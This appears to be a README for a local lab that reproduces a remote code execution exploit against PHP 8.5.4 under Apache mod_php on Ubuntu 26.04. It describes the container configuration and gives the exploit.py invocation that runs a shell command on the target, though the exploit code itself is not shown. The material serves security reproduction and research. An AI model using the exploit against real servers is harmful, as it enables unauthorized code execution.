# Ubuntu 26.04 PHP 8.5.4 lab

This mirrors the circulating `mod_php` lab:

- Ubuntu 26.04;
- Apache prefork with one worker;
- `libapache2-mod-php8.5` pinned to `8.5.4-0ubuntu1.3`;
- `/index.php` contains only `<?php // Silence is golden.`;
- `memory_limit=8M`;
- upload-progress updates forced on every multipart event.

```bash
docker compose -f lab/ubuntu-php85/compose.yml up --build -d
curl -i http://127.0.0.1:18080/index.php
```

Run the calibrated one-shot from the repository root:

```bash
python3 exploit.py \
  -u http://127.0.0.1:18080/index.php \
  --profile ubuntu855 \
  -c 'id>/out/p1' \
  --proof-file out/p1 \
  --offsets-file '' \
  --no-auto-offsets
```

The container is `linux/amd64`. On Apple Silicon Docker Desktop this runs
through Rosetta, which changes dynamic-debugging behavior but not the
relative heap geometry used by the exploit.
